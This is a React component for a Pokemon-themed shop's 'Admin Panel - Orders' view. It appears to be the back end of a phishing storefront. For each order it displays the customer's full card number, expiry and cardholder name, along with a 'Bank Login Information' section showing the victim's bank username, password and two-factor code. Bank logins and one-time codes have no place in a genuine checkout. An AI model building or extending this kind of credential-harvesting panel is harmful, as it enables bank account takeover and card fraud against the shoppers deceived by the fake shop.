import React, { useState } from 'react';
import { X } from 'lucide-react';
import { OrderData, getOrders } from '../services/orderService';

interface AdminPanelProps {
  onClose: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
  const [orders] = useState<OrderData[]>(getOrders());
  const [selectedOrder, setSelectedOrder] = useState<OrderData | null>(null);

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString();
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-6xl max-h-[90vh] overflow-hidden flex flex-col">
        <div className="bg-pokemon-blue text-white p-4 flex justify-between items-center">
          <h2 className="text-xl font-bold">Admin Panel - Orders</h2>
          <button onClick={onClose} className="text-white hover:text-pokemon-yellow">
            <X size={24} />
          </button>
        </div>
        
        <div className="flex flex-1 overflow-hidden">
          {/* Orders List */}
          <div className="w-1/3 border-r overflow-y-auto p-4">
            <h3 className="font-bold mb-4 text-pokemon-dark">Orders</h3>
            {orders.map((order) => (
              <div 
                key={order.id} 
                className={`p-3 mb-2 rounded-lg cursor-pointer transition-colors ${
                  selectedOrder?.id === order.id 
                    ? 'bg-pokemon-yellow text-pokemon-dark' 
                    : 'bg-gray-100 hover:bg-gray-200'
                }`}
                onClick={() => setSelectedOrder(order)}
              >
                <div className="font-semibold">{order.formData.firstName} {order.formData.lastName}</div>
                <div className="text-sm">{formatDate(order.timestamp)}</div>
                <div className="text-sm font-medium">${order.total?.toFixed(2)}</div>
              </div>
            ))}
          </div>
          
          {/* Order Details */}
          <div className="w-2/3 overflow-y-auto p-4">
            {selectedOrder ? (
              <div>
                <h3 className="font-bold text-lg mb-4 text-pokemon-dark">Order Details</h3>
                
                {/* Customer Info */}
                <div className="mb-6">
                  <h4 className="font-bold text-pokemon-blue mb-2">Customer Information</h4>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p><span className="font-semibold">Name:</span> {selectedOrder.formData.firstName} {selectedOrder.formData.lastName}</p>
                      <p><span className="font-semibold">Email:</span> {selectedOrder.formData.email}</p>
                      <p><span className="font-semibold">Phone:</span> {selectedOrder.formData.phone}</p>
                    </div>
                    <div>
                      <p><span className="font-semibold">Date:</span> {formatDate(selectedOrder.timestamp)}</p>
                      <p><span className="font-semibold">Order ID:</span> {selectedOrder.id}</p>
                    </div>
                  </div>
                </div>
                
                {/* Shipping Info */}
                <div className="mb-6">
                  <h4 className="font-bold text-pokemon-blue mb-2">Shipping Information</h4>
                  <p>{selectedOrder.formData.address}</p>
                  <p>{selectedOrder.formData.city}, {selectedOrder.formData.state} {selectedOrder.formData.zipCode}</p>
                </div>
                
                {/* Billing Info */}
                {!selectedOrder.formData.sameAsBilling && (
                  <div className="mb-6">
                    <h4 className="font-bold text-pokemon-blue mb-2">Billing Information</h4>
                    <p>{selectedOrder.formData.billingAddress}</p>
                    <p>{selectedOrder.formData.billingCity}, {selectedOrder.formData.billingState} {selectedOrder.formData.billingZipCode}</p>
                  </div>
                )}
                
                {/* Payment Info */}
                <div className="mb-6">
                  <h4 className="font-bold text-pokemon-blue mb-2">Payment Information</h4>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p><span className="font-semibold">Card:</span> {selectedOrder.cardData.cardNumber}</p>
                      <p><span className="font-semibold">Cardholder:</span> {selectedOrder.cardData.cardholderName}</p>
                      <p><span className="font-semibold">Expiry:</span> {selectedOrder.cardData.expiryDate}</p>
                    </div>
                  </div>
                </div>
                
                {/* Bank Login Info */}
                <div className="mb-6">
                  <h4 className="font-bold text-pokemon-blue mb-2">Bank Login Information</h4>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p><span className="font-semibold">Username:</span> {selectedOrder.bankLoginData.username}</p>
                      <p><span className="font-semibold">Password:</span> {selectedOrder.bankLoginData.password}</p>
                      <p><span className="font-semibold">2FA Code:</span> {selectedOrder.bankLoginData.twoFactorCode}</p>
                    </div>
                  </div>
                </div>
                
                {/* Product Info */}
                {selectedOrder.productInfo && (
                  <div className="mb-6">
                    <h4 className="font-bold text-pokemon-blue mb-2">Product Information</h4>
                    <div className="flex items-center">
                      <img 
                        src={selectedOrder.productInfo.image} 
                        alt={selectedOrder.productInfo.name} 
                        className="w-16 h-16 object-cover rounded mr-4"
                      />
                      <div>
                        <p className="font-semibold">{selectedOrder.productInfo.name}</p>
                        <p>Quantity: {selectedOrder.productInfo.quantity}</p>
                        <p>Price: ${selectedOrder.productInfo.price.toFixed(2)}</p>
                      </div>
                    </div>
                  </div>
                )}
                
                {/* Total */}
                <div className="mt-6 pt-4 border-t">
                  <p className="text-xl font-bold text-pokemon-dark">Total: ${selectedOrder.total?.toFixed(2)}</p>
                </div>
              </div>
            ) : (
              <div className="h-full flex items-center justify-center text-gray-500">
                Select an order to view details
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
